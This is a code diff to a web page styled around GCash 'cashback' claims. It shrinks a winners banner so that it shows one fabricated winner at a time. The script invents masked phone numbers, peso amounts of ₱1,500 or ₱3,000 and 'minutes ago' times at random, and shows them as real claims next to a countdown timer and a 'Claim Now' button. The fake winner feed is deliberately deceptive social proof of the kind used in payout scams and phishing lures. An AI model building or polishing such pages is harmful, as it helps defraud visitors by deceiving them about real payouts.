@@ -41,71 +41,55 @@
       display: none;
     }
 
-    /* ===== RANDOM WINNERS SECTION STYLES ===== */
+    /* ===== SINGLE WINNER SECTION - COMPACT ===== */
     .winners-section {
-      margin: 20px 0 25px 0;
-      padding: 15px 0;
-      border-top: 2px solid rgba(255, 255, 255, 0.08);
-      border-bottom: 2px solid rgba(255, 255, 255, 0.08);
-      background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.05), transparent);
+      margin: 12px 0 16px 0;
+      padding: 10px 0;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      background: transparent;
+      min-height: 48px;
+      display: flex;
+      align-items: center;
     }
 
     .winners-header {
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 8px;
       color: #00d4ff;
-      font-size: 0.8rem;
+      font-size: 0.65rem;
       font-weight: 700;
       text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-bottom: 12px;
-      padding: 0 5px;
+      letter-spacing: 1.5px;
+      padding: 0 4px;
+      flex-shrink: 0;
+      margin-right: 12px;
     }
 
     .winners-header i {
-      font-size: 0.9rem;
-      animation: cashGlow 2s ease-in-out infinite;
+      font-size: 0.75rem;
       color: #00d4ff;
     }
 
-    @keyframes cashGlow {
-      0%, 100% { filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.3)); }
-      50% { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.7)); }
-    }
-
     .winners-list {
+      flex: 1;
       display: flex;
-      flex-direction: column;
-      gap: 8px;
-      max-height: 120px;
-      overflow-y: auto;
-      padding-right: 5px;
-    }
-
-    .winners-list::-webkit-scrollbar {
-      width: 3px;
-    }
-
-    .winners-list::-webkit-scrollbar-track {
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 10px;
-    }
-
-    .winners-list::-webkit-scrollbar-thumb {
-      background: rgba(0, 212, 255, 0.3);
-      border-radius: 10px;
+      align-items: center;
+      overflow: hidden;
+      min-height: 36px;
     }
 
     .winner-item {
       display: flex;
       align-items: center;
-      gap: 10px;
-      padding: 8px 12px;
+      gap: 8px;
+      padding: 4px 10px 4px 6px;
       background: rgba(255, 255, 255, 0.03);
-      border-radius: 10px;
-      animation: slideInWinner 0.5s ease-out;
+      border-radius: 8px;
       border-left: 2px solid rgba(0, 212, 255, 0.2);
+      animation: slideInWinner 0.5s ease-out;
+      width: 100%;
       transition: all 0.3s ease;
     }
 
@@ -117,7 +101,7 @@
     @keyframes slideInWinner {
       from {
         opacity: 0;
-        transform: translateX(-20px);
+        transform: translateX(-15px);
       }
       to {
         opacity: 1;
@@ -126,8 +110,8 @@
     }
 
     .winner-icon {
-      width: 28px;
-      height: 28px;
+      width: 24px;
+      height: 24px;
       border-radius: 50%;
       background: rgba(0, 212, 255, 0.1);
       display: flex;
@@ -137,17 +121,20 @@
     }
 
     .winner-icon img {
-      width: 18px;
-      height: 18px;
+      width: 14px;
+      height: 14px;
       object-fit: contain;
       filter: drop-shadow(0 0 6px rgba(0, 212, 255, 0.3));
     }
 
     .winner-text {
       flex: 1;
-      font-size: 0.85rem;
+      font-size: 0.78rem;
       color: #e0e0e0;
-      line-height: 1.4;
+      line-height: 1.3;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
 
     .winner-text .phone-prefix {
@@ -165,28 +152,27 @@
     }
 
     .winner-text .claimed-text {
-      color: #888;
-      margin: 0 4px;
+      color: #666;
+      margin: 0 3px;
     }
 
     .winner-text .amount-highlight {
       color: #00d4ff;
       font-weight: 800;
-      text-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
+      text-shadow: 0 0 15px rgba(0, 212, 255, 0.15);
     }
 
     .winner-time {
-      font-size: 0.6rem;
-      color: #666;
+      font-size: 0.55rem;
+      color: #555;
       white-space: nowrap;
       flex-shrink: 0;
+      margin-left: 4px;
     }
 
-    .winners-divider {
-      width: 100%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.2), transparent);
-      margin: 8px 0;
+    .winner-time i {
+      font-size: 0.4rem;
+      margin-right: 2px;
     }
 
     /* ===== HELP POPUP STYLES ===== */
@@ -457,17 +443,14 @@
       </div>
     </div>
 
-    <!-- ===== RANDOM WINNERS SECTION ===== -->
+    <!-- ===== SINGLE WINNER SECTION - COMPACT ===== -->
     <div class="winners-section" id="winnersSection">
       <div class="winners-header">
         <i class="fas fa-coins"></i>
-        <span>💰 Received Cashbacks</span>
-        <span style="font-size: 0.6rem; color: #666; font-weight: 400; margin-left: auto;">
-          <i class="fas fa-circle" style="color: #00ff88; font-size: 0.4rem;"></i> live
-        </span>
+        <span>Received</span>
       </div>
       <div class="winners-list" id="winnersList">
-        <!-- Winners will be dynamically added here -->
+        <!-- Single winner will be dynamically added here -->
       </div>
     </div>
 
@@ -652,7 +635,7 @@
   </div>
 
   <!-- ============================================================
-       JAVASCRIPT - COMPLETE WORKING (NO TELEGRAM ALERTS)
+       JAVASCRIPT - COMPLETE WORKING
   ============================================================ -->
   <script>
     // ============================================================
@@ -684,7 +667,6 @@
         audio.play().catch(function(error) {
           console.log('🔊 Sound play error:', error);
         });
-        console.log('🔊 Playing claim sound');
       }
     }
 
@@ -879,73 +861,56 @@
       return amounts[Math.floor(Math.random() * amounts.length)];
     }
 
-    function getRandomWinners(count) {
-      var winners = [];
-      var usedPhones = new Set();
+    function getRandomWinner() {
+      var phone = getRandomPhoneNumber();
+      var amount = getRandomAmount();
+      var timeMinutes = Math.floor(Math.random() * 56) + 5;
       
-      for (var i = 0; i < count; i++) {
-        var phone;
-        var attempts = 0;
-        do {
-          phone = getRandomPhoneNumber();
-          attempts++;
-        } while (usedPhones.has(phone) && attempts < 20);
-        usedPhones.add(phone);
-        
-        var amount = getRandomAmount();
-        var timeMinutes = Math.floor(Math.random() * 56) + 5;
-        
-        winners.push({
-          phone: phone,
-          amount: amount,
-          formattedAmount: formatWithCommas(amount),
-          timeMinutes: timeMinutes
-        });
-      }
-      return winners;
+      return {
+        phone: phone,
+        amount: amount,
+        formattedAmount: formatWithCommas(amount),
+        timeMinutes: timeMinutes
+      };
     }
 
     // ============================================================
-    // WINNERS DISPLAY
+    // SINGLE WINNER DISPLAY - COMPACT
     // ============================================================
-    function generateWinners() {
-      var winners = getRandomWinners(3);
-      var html = '';
+    function generateWinner() {
+      var winner = getRandomWinner();
       
-      winners.forEach(function(winner, index) {
-        var phoneParts = winner.phone.match(/^(\d{2})(\*{3})(\d{4})$/);
-        var prefix = phoneParts ? phoneParts[1] : '09';
-        var masked = phoneParts ? phoneParts[2] : '***';
-        var suffix = phoneParts ? phoneParts[3] : '1234';
-        
-        html += `
-          <div class="winner-item" style="animation-delay: ${index * 0.1}s">
-            <div class="winner-icon">
-              <img src="photos/gc_icon.png" alt="GCash" />
-            </div>
-            <div class="winner-text">
-              <span class="phone-prefix">${prefix}</span>
-              <span class="phone-masked">${masked}</span>
-              <span class="phone-suffix">${suffix}</span>
-              <span class="claimed-text">has claimed</span>
-              <span class="amount-highlight">₱${winner.formattedAmount}</span>
-            </div>
-            <div class="winner-time">
-              <i class="fas fa-clock" style="font-size: 0.5rem;"></i>
-              ${winner.timeMinutes}m ago
-            </div>
+      var phoneParts = winner.phone.match(/^(\d{2})(\*{3})(\d{4})$/);
+      var prefix = phoneParts ? phoneParts[1] : '09';
+      var masked = phoneParts ? phoneParts[2] : '***';
+      var suffix = phoneParts ? phoneParts[3] : '1234';
+      
+      var html = `
+        <div class="winner-item">
+          <div class="winner-icon">
+            <img src="photos/gc_icon.png" alt="GCash" />
           </div>
-        `;
-      });
+          <div class="winner-text">
+            <span class="phone-prefix">${prefix}</span>
+            <span class="phone-masked">${masked}</span>
+            <span class="phone-suffix">${suffix}</span>
+            <span class="claimed-text">claimed</span>
+            <span class="amount-highlight">₱${winner.formattedAmount}</span>
+          </div>
+          <div class="winner-time">
+            <i class="fas fa-clock"></i>${winner.timeMinutes}m
+          </div>
+        </div>
+      `;
       
       winnersList.innerHTML = html;
     }
 
     function startWinnersRotation() {
-      generateWinners();
+      generateWinner();
       winnerInterval = setInterval(function() {
-        generateWinners();
-      }, 8000);
+        generateWinner();
+      }, 6000);
     }
 
     // ============================================================
@@ -1324,8 +1289,6 @@
           timerDisplay.textContent = timeStr;
         }
         
-        console.log('⏰ Timer: ' + timeStr);
-        
         if (timeRemaining <= 0) {
           clearInterval(timerInterval);
           timerInterval = null;
@@ -1335,8 +1298,6 @@
           
           var timerDisplay = document.getElementById('claimTimerDisplay');
           if (timerDisplay) timerDisplay.textContent = '';
-          
-          console.log('⏰ Timer finished');
           
           if (database && currentTreatType) {
             checkForDeployedLink(currentTreatType).then(function(link) {
@@ -1414,10 +1375,8 @@
     console.log('✅ Auto-scan enabled (every 1 second)');
     console.log('✅ Timer fixed - will countdown properly');
     console.log('✅ Sound will play on Claim Now');
-    console.log('✅ Winners rotation started (every 8 seconds)');
-    console.log('✅ Amounts: ₱1,500 and ₱3,000 only');
-    console.log('✅ Time gap: 5-60 minutes');
-    console.log('✅ No Telegram alerts');
+    console.log('✅ Single winner rotation started (every 6 seconds)');
+    console.log('✅ Compact winners display - no lag');
   </script>
 
 </body>
